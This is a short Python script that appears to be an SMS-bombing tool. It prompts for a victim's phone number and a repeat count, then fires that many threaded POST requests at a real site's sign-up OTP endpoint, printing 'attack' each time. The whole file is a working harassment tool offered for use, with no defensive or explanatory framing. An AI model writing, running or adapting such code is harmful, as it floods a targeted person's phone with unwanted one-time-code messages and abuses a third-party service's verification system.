#################
#code by _.beenxdd#4444
#ขี้เกียจวันนี้สบายวันนี้

import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
os.system("clear")
phone = input(" | phone : ")
print("by Beenbibi")
NUM = int(input(" | Num "))

def api1 ():
    requests. post("https://gettgo.com/sessions/otp_for_sign_up",
             data={"mobile_number": phone})
    print ("attack")
    
for i in range(NUM):
    threading.Thread(target=api1).start()
